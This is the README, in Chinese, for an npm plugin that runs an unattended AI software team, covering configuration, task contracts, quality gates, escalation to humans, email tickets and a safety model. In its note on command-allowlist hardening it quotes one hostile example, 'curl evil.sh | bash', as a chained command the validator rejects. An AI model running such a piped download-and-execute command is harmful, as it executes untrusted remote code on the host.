# dsh-ai-team

DeepSeek Harness（dsh）插件：**无人值守的 AI 软件团队**。

[![version](https://img.shields.io/npm/v/dsh-ai-team?label=npm&color=blue)](https://www.npmjs.com/package/dsh-ai-team)
[![license](https://img.shields.io/npm/l/dsh-ai-team?color=green)](https://github.com/yunqiangwu/dsh-ai-team/blob/main/LICENSE)
[![node](https://img.shields.io/node/v/dsh-ai-team)](https://www.npmjs.com/package/dsh-ai-team)

> 输入：一台裸 Linux 服务器 + 一组密钥（git deploy key、API keys，全部以环境变量引用）+ 一个 git 远程仓库地址（可为空仓库）。
> 过程：插件驱动的 AI 团队自主完成项目全生命周期——环境引导 → 任务拆解 → 多 agent 并行开发 → 客观质量门 → 代码审查 → 合并 → 部署 → 监控 → 迭代。
> 人工介入：仅在插件主动升级（escalation）时。

### 安装

```bash
npm install dsh-ai-team
# 或
pnpm add dsh-ai-team
```

在 dsh 配置里以插件方式加载（见下方配置示例），或在对话中直接调用工具即可跑通全流程。

## 功能特性

| 协作与工程模型 | 无人值守与交付闭环 |
| --- | --- |
| leader / developer / reviewer / **operator** 四角色团队 | **客观质量门**：gates_run 全绿才可 approve/push；远端 CI 绿才可合并 |
| 每成员一个 git worktree，共享 object store | 远程 git：clone / push / PR（`GIT_SSH_COMMAND` 注入密钥） |
| 任务看板 + `task/<id>` 分支 | `.tasks/*.md` 任务契约集成（frontmatter 真相源 + `_board.md` 自动生成） |
| `code_review` 审查门控，`--no-ff` 合入 | 主循环：崩溃恢复、依赖/域锁派发、卡死检测、空转降频、完成报告 |
| session 事件 + 投影 + Web 看板 | 升级机制：`needs-human` 打标 + 任务单留言 + webhook 通知 + 粒度化暂停 |
| — | 部署闭环：健康检查（指数退避）+ 自动回滚 + 部署历史 |
| — | 人工确认：邮件通知 + 问卷工单，答复自动回写、可自动恢复循环 |
| — | 安全硬规则：密钥只引用不落盘、命令白名单、forbiddenPaths、push 安全 |

## 快速开始

**方式一：作为 dsh 插件加载（推荐）**

在 dsh 配置文件（`cordis.patch.yml`）里引用本包，并填入你的部署配置：

```yaml
- insert:
    - id: autopilot
      name: dsh-ai-team
      config:
        rootDir: .dsh-ai-team
        # ……（完整配置见下一节）
```

然后启动 dsh Web 端：

```bash
pnpm dsh web --patch ./cordis.patch.yml
```

**方式二：源码开发（克隆本仓库）**

```bash
pnpm install
pnpm build
pnpm dsh web --patch ./cordis.patch.yml
```

无论哪种方式，之后在对话中依次调用工具即可跑通全流程：

```
autopilot_init        # 克隆远程 → 工具链检测/安装 → setup → verify
team_add_member …     # 补齐 developer / reviewer / operator
autopilot_run         # 启动无人值守主循环（幂等）
autopilot_status      # 随时查看：循环状态 / 看板 / 升级 / 部署历史
```

## 配置（Config schema）

所有"部署间可能不同"的值都在 Config 中，误配置 fail loud 并指出具体 key。**密钥一律配置环境变量名**（`xxxEnv`），插件运行时 `process.env[name]` 读取，值绝不落盘、进日志即脱敏为 `***`。

```yaml
- insert:
    - id: autopilot
      name: dsh-ai-team
      config:
        rootDir: .dsh-ai-team        # 工作区与状态根目录
        baseBranch: main
        maxMembers: 8
        maxTasks: 512
        remote:
          url: git@github.com:org/repo.git   # 可为空仓库
          sshKeyEnv: AUTOPILOT_GIT_KEY       # 环境变量名，禁止直接传密钥值
          platform: github                    # github | cnb | gitlab | generic
          apiTokenEnv: GITHUB_TOKEN           # PR/CI API token 的环境变量名
        bootstrap:
          enabled: true
          toolchain: [git, bun, pnpm, node]       # bun rootless 装到 ~/.bun；node rootless 装到 ~/.node
          setupCommand: pnpm run setup            # 仓库内一键初始化
          verifyCommand: pnpm run e2e:local       # 环境自验证
          systemPackages: [python3, make, g++]    # 原生模块(node-gyp)编译所需，如 better-sqlite3
          packageManagerCommand: sudo apt-get install -y   # 系统包安装命令，须命中白名单
          envFile: .env                           # 从模板生成 .env（不覆盖已有，缺省不动作）
          envExample: .env.example                # 模板路径；配了才生成
          requiredEnvKeys: [AUTH_SECRET]          # 缺失则引导 fail-loud 并指明 key
        gates:
          commands: [pnpm run typecheck, pnpm run lint, pnpm run test, pnpm run build]
          e2eCommand: pnpm run e2e:local
          requireCiGreen: true                # 有远端 CI 时以 CI 为准
          timeoutMinutes: 30
        daemon:
          heartbeatSeconds: 60                # 心跳落盘，崩溃可恢复
          maxReviewRounds: 3                  # 返工上限，超过升级
          stuckMinutes: 45                    # 无 git 活动超时，升级
          pollIntervalSeconds: 30
        escalation:
          webhookUrlEnv: AUTOPILOT_WEBHOOK    # 通知 webhook 的环境变量名
          label: needs-human
          pauseOnEscalation: task             # task | team
        notification:                          # 无人值守时人工确认通道
          enabled: true
          smtp:
            host: smtp.qq.com                 # smtp.163.com / smtp.gmail.com
            port: 465                         # 465=隐式 TLS；587=STARTTLS
            secure: true
            userEnv: AUTOPILOT_SMTP_USER      # 环境变量名，勿写值
            passEnv: AUTOPILOT_SMTP_PASS      # SMTP 授权码，环境变量名
            fromEnv: AUTOPILOT_SMTP_FROM      # 可选，默认取 user
            startTls: true                    # 非 465 端口走 STARTTLS
          mailTo: ops@example.com             # 收件人（可逗号分隔多个）
          ticket:
            host: 0.0.0.0                     # 本地工单端点绑定地址
            port: 8080                        # 0=自动分配端口
            publicBaseUrl: http://server.example.com  # 邮件里展示的工单根地址
          autoResume: true                    # 工单答复后自动回写并解除升级
        deploy:
          enabled: false
          command: 'docker build -t app . && docker push ... && ssh ... docker compose up -d'
          healthCheckUrl: https://app.example.com/health
          rollbackCommand: 'ssh ... docker compose rollback'
          secretsEnv: []                      # 部署密钥环境变量名白名单
        security:
          forbiddenPaths: ['.github/', 'AGENTS.md', 'LICENSE']   # human-only 区
          commandAllowlist: [pnpm, git, bun, docker]             # 可执行命令前缀
          pushRequiresGates: true             # 门不过禁止 push 与 approve
        buildCache:                           # 可选：构建缓存（默认关闭）
          enabled: true                       # 把 .nuxt/.output/coverage 等软链到共享目录，减少每条任务全量 build
          dirs: ['.nuxt', '.output', 'dist', 'coverage', '.vitest', 'node_modules/.cache']
        profile:                              # 项目约定适配器（可选，见下方说明）
          preset: agentdeploy                 # 'default' | 'agentdeploy'；留空 = default
          # 其余字段可逐项覆写 preset；缺省回退到 preset 默认值。
          #   branchTemplate: 'agent/{id}-{slug}'
          #   prTitleTemplate: 'feat({scope}): [{id}] {title}'
          #   mergeStrategy: squash            # no-ff | squash | merge
          #   gates:                           # 每条可带 when(touches 前缀)/role(local|ci)
          #     - command: pnpm run typecheck
          #     - command: pnpm run db:check-parity
          #       when: [server/db/]
          #     - command: pnpm audit --audit-level=high
          #       role: ci                     # 仅由远端 CI 强制，本地不跑不红门
```

## 项目 Profile（约定适配器）

不同仓库的协作"纹路"往往同构但细节不同：分支命名（`task/<id>` vs `agent/<id>-<slug>`）、PR 标题（`[id] title` vs `feat(scope): [id] desc`）、合并策略（`--no-ff` vs **squash**）、以及**域条件**与**CI-only** 的质量门。与其把某一种约定写死在引擎里，`profile` 把「一个项目一套约定」编码成可配的适配层。默认 `default` 完全复刻历史行为；项目 `preset`（内置 `agentdeploy`）只在有差异的字段上覆写，其余内联字段可再逐项覆盖（缺省回退到 preset 默认值）。

`profile` 字段一览（全部可选）：

| 字段 | 默认 | 说明 |
| --- | --- | --- |
| `preset` | `default` | `default`（历史行为）或 `agentdeploy`（AgentDeploy 约定） |
| `branchTemplate` | `task/{id}` | 分支名模板；`{id}`=任务号、`{slug}`=标题 kebab-case |
| `prTitleTemplate` | `[{id}] {title}` | PR 标题模板；`{id}`/`{title}`/`{scope}` |
| `prBodyTemplate` | `关联任务单…` | PR 正文模板；`{id}`/`{title}`/`{touches}`/`{scope}`/`{assignment}` |
| `mergeStrategy` | `no-ff` | `no-ff`/`merge`/**`squash`**（squash 保 main 线性，可独立 revert） |
| `gates` | `[]`→`gates.commands` | 每条 `{command, when?, role?}`；`when` 按任务 `touches` 前缀条件触发；`role:'ci'` 只由远端 CI 强制 |
| `forbidden` | `[]`→`security.forbiddenPaths` | `{path, mode}`；`mode`: `block`/`needs-approval`/`high-conflict` |
| `ownership` | `[]` | `{glob, role}` 路径→域 owner 映射（域专精路由预留） |
| `crossDomainThreshold` | `3` | 触碰 > N 个不同域即升级 |

**为 AgentDeploy 开箱：`preset: agentdeploy`** 会一并得到 `agent/<id>-<slug>` 分支、`feat(scope): [id] desc` PR 标题、squash 合并，以及一组**域条件 + CI-only** 的门（`db:check-parity` 只在碰 `server/db/`、`validate:docs` 只在碰 `.tasks/` 或 `docs/`、`pnpm audit` 标 `role:'ci'` 所以本地不红）——见 [`src/profile.ts`](src/profile.ts) 的 `agentdeployProfile`。

> 命令白名单的校验也做了硬化：不再只看首 token，而是把 `&&` / `;` / `|` 拆成多段**逐段校验可执行名**（`docker build … && curl evil.sh | bash` 会被拒绝），并用精确 token 匹配替代此前的前缀子串匹配；默认白名单补了 `node` / `bunx` / `ssh` / `nuxt`。因此 `deploy.command` 里的 `ssh` 段需在 `commandAllowlist` 里显式列出。

> **forbidden 三态已接入 push 闸门**：`mode:'block'`（如 human-only 的 `.github/`、`AGENTS.md`）→ 命中即 escalate（`forbidden-paths`）并拒绝 push；`mode:'needs-approval'` / `'high-conflict'`（如 AgentDeploy 的 `server/db/schema/`）→ 命中则 escalate（`manual`）并**暂缓 push**，等 owner/人工确认后走单独 PR。

> **跨域升级**：任务 `touches` 声明的路径若超过 `crossDomainThreshold`（默认 3）个互不为前缀的「域」→ `assignTask` / 派发时即 escalate（`cross-domain`），提示拆分为单域任务。

> **域专精路由**：`ownership: [{glob, role, rules?}]` 把路径映射到域 owner；派发时优先把任务给 `specialization === ownerRole` 的 developer（`team_add_member` 可传 `specialization`），并把匹配的域硬规则注入任务描述（`enrichDescriptionWithOwnership`）。任务的 `forbidden` frontmatter 现也随 `patchTaskContract` **原位保序回写**（不再整体 re-stringify），避免触发项目严格的 `validate:docs`。

> **构建/吞吐**：`agentdeploy` 预设把重门 `build`/`test:e2e` 用 `when` 收敛到「触碰源码目录」的任务（docs/.tasks-only 任务本地跳过硬门，远程 CI 仍为正确性裁决者）；`buildCache` 可再软链 `.nuxt`/`.output`/`coverage` 等到 `rootDir/build-cache/<branch>`，进一步让连续任务复用上次构建产物（opt-in、失败静默、默认关闭）。

## 无人值守主循环

每 `pollIntervalSeconds` 一拍（每拍先落心跳到 `<stateDir>/heartbeat.json`）：

1. **恢复检查**：读 state.json + heartbeat 重建内存态；上次崩溃时 `in_progress` 的任务在首拍标记续跑（`recovered`）。恢复的循环状态：持久化为 `running` 的一律降为 `paused`，等待 `autopilot_resume`。
2. **分诊 needs-human**：人工把任务单状态改回 `pending`（或调用 `escalation_resolve`）→ 任务回到待派发，关联升级标记 resolved。
3. **派发**：`depends_on` 全部 done 且 `status=pending` 的任务，域锁检查（`in_progress` 任务 `touches` 目录交集为空）→ 派给空闲 developer。
4. **审查闸门**：reviewer 调 `code_review` approve 前必须 `gates_run` 全绿（`pushRequiresGates`）；有远端 CI 且 `requireCiGreen` 时 CI 也必须绿。`--no-ff` 合入 base；合并冲突拒绝并保持 `in_review`。
5. **返工上限**：`request_changes` 轮次 ≥ `maxReviewRounds` → escalate（说明任务拆分或理解有误）。
6. **卡死检测**：任务 `stuckMinutes` 无 git 活动 → escalate。
7. **部署**：base 有合并且 `deploy.enabled` 且 CI 绿 → `deploy_run`；健康检查 3 次失败自动 `rollbackCommand` 并升级。
8. **空转保护**：连续无事件拍降频轮询（最多 4×）；所有任务 done → 写 `.tasks/_completion.md` 完成报告并停机等待。

**升级触发条件**（任一命中即 escalate，禁止自行绕过）：需求矛盾 / 跨 3+ 域改动 / 需新增付费依赖或密钥 / 非本任务导致的门红 / 触及 forbiddenPaths / 返工超限 / 任务卡死 / 部署连续失败 / 引导失败。

## 任务契约（.tasks/*.md）

任务真相源是仓库内 `.tasks/<id>.md` 的 YAML frontmatter + Gherkin 验收：

```markdown
---
id: CORE-1
title: set up core module
status: pending        # pending → in_progress → done；needs-human 阻塞可回 pending
owner: dev-1
depends_on: [CORE-0]
touches: [server/core/]
---

Given/When/Then 验收标准……
```

- `task_assign` 传 `contractId` 时校验任务单存在且状态为 `pending`，title/depends_on/touches 以任务单为准。
- 每次状态变更回写 frontmatter 并重新生成 `.tasks/_board.md`（自动生成，勿手改），改动以插件身份提交在 base 分支，保持集成检出干净。
- developer 的 DoD：质量门全绿 + 每条验收标准的验证证据写入 PR 描述。

## 人工确认与问卷工单（notification）

无人值守时一旦升级（needs-human），插件会通过配置的通知通道把人"叫来"：

1. **本地问卷工单端点**：插件用 `node:http` 起一个本地端点，`GET /ticket/<id>` 渲染一个表单（原因、说明、建议动作 + 用户填写决策/补充），`POST /ticket/<id>` 接收答复。
2. **SMTP 邮件通知**：按 `smtp.*` 配置发信到 `mailTo`，正文包含任务、原因、建议动作与工单链接。凭证只取环境变量名并在日志中脱敏，绝不落盘。
3. **答复闭环**：用户提交后，答复被回写到任务单（`.tasks/<id>.md`），并在 `autoResume: true` 时自动解除升级、把任务改回 `pending`、继续主循环；`autoResume: false` 则保持 `needs-human`，等你主动 `escalation_resolve`。

> 端点无公网域名时，可用反向代理 / 内网穿透把这些端口暴露出去；`ticket.publicBaseUrl` 只决定邮件里展示的工单根地址。

## 安全模型

1. **密钥只引用不落盘**：Config 只存环境变量名；运行时读 `process.env`；所有日志（门输出、部署输出、webhook 负载、升级记录）经 SecretRedactor 强制脱敏。
2. **命令白名单**：gates / bootstrap / deploy 的每条命令必须命中 `commandAllowlist` 前缀，否则拒绝执行并提示走升级。
3. **forbiddenPaths**：push 前检查分支 diff，触及 human-only 区直接拒绝并升级。
4. **门不过不合并**：`pushRequiresGates=true` 时，门未绿禁止 push 与 approve；`requireCiGreen` 时远端 CI 不绿禁止 approve。
5. **破坏性 git 操作禁止**：不 force-push 共享分支（任务/成员分支仅允许 `--force-with-lease`），不 reset 共享分支，不删 base 分支。

## 工具一览

**团队与协作**：`team_create` / `team_add_member` / `team_list` / `team_status` / `team_branch` / `task_assign` / `task_update` / `code_review`。

**无人值守与交付**：`autopilot_init` / `autopilot_run` / `autopilot_pause` / `autopilot_resume` / `autopilot_status` / `gates_run` / `pr_sync` / `escalate` / `escalation_resolve` / `deploy_run`。

## Web 面板

在 `conversation.input.dock` 插槽渲染：运行状态灯（running/paused/escalated/completed/stopped）、六列看板（含 needs-human）、质量门徽标与 CI 徽标、升级事件流、部署历史。数据流沿用 session 事件（`autopilot/update` 全量快照）+ 投影（last-write-wins），不引入 RPC。

另在 **设置 → 插件 → 插件配置** 挂了一张 `autopilot` 卡片（`settings.plugin.item` 键控命名空间）。它绑定服务端 `ctx.settings.register` 注册的 `autopilot` 命名空间，暴露关键字段（`remote.url`、`baseBranch`、`bootstrap.enabled`、`gates.commands`、`daemon.heartbeatSeconds`/`maxReviewRounds`/`stuckMinutes`）供编辑保存，写入用户设置层；服务端通过 `installSettingsSection` 让插件读到生效配置（无设置服务时回退到 entry config）。因命名空间在插件加载时注册，改动需**带 `--patch` 重启服务端**后生效。

## Agent 预设：Autopilot 团队（一键切换模式）

想让"启用"变成一次**切换模式**而不是改配置，用 DSH 的 agent preset 机制即可。插件自带一个 `autopilot-team` agent 预设：

- **随包分发**：模板在插件包内 `preset/autopilot-team/`（已加入 `package.json` 的 `files`），随 `npm/pnpm publish` 一起发布。
- **自动落盘**：插件 `apply()` 里通过 `src/preset.ts` 的 `ensureAutopilotTeamPreset()` 把这个模板拷贝到用户级预设根 `~/.dsh/.agent-presets/autopilot-team/`，**缺失才拷贝、绝不覆盖**（用户自建的 `autopilot-team` 优先），失败静默不阻塞加载。因此**安装并重启后即可在 agent 模式列表里看到「Autopilot 团队」**，无需手建文件。
- **组合内容**：`agent.cordis.yml` 复刻 `standard` 的全套工具（shell/fs/subagent/workflow 等）并把人格设为 autopilot 团队编排队 leader；`preset.yml` 提供名称/描述/排序。
- **效果**：在 agent 模式列表里切到 **Autopilot 团队**，该会话就变成"无人值守 AI 软件团队"的编排队；`dsh-ai-team` 的宿主插件工具是全站全局的，本预设无需重复 include。
- **自动开箱感应**：插件在 `apply()` 里监听 `session/event` 的 `agent-preset/selected`，当选中 `autopilot-team` 时**自动创建一个 `demo` 团队**并把投影快照推到该会话，脚本号拉起看板（无需手动先调 `team_create`）。
- **反复安全**：仅当尚无团队时才创建；`session.append` 前先让出微任务，避免在 `agent-preset/selected` 追加的发布边界内重入。

> **重启生效**：`autopilot-team` 预设目录的盘点是无缓存的（即时读取），所以预设一旦落盘，刷新代理模式列表即可看到；但**自动建 `demo` 团队**这个钩子在本插件的宿主 `lib/index.js` 里，改动宿主代码后需**重启服务端**才会生效。



## 开发

```bash
pnpm install
pnpm typecheck   # tsc strict，0 error
pnpm lint        # oxlint，0 warning
pnpm test        # vitest：集成（真实本地 bare 仓库模拟 remote）+ 无人值守 + 通知闭环（mock SMTP + 工单端点）+ cordis 冒烟
pnpm build       # tsc + tsdown → lib/{index.js, client.js}

# 发布前跑一次完整校验（prepublishOnly 会自动执行下面的组合）
pnpm pack --dry-run   # 查看将打进 npm 包的文件清单
```

架构约定：核心服务 `AutopilotService` 与 cordis 完全解耦（不 import ctx），可独立实例化跑测试；插件层只做四导出（`name` / `inject` / `Config` / `apply`，只命名导出）、服务暴露（`ctx.provide('autopilot')`）、工具注册与 `ctx.effect` 清理。

> **贡献与发布**：遵循 MIT 协议。`npm publish` 前会自动执行 `prepublishOnly` 校验（typecheck + lint + test + build），全部通过才会发包。仓库与 issue 见 [github.com/yunqiangwu/dsh-ai-team](https://github.com/yunqiangwu/dsh-ai-team)。
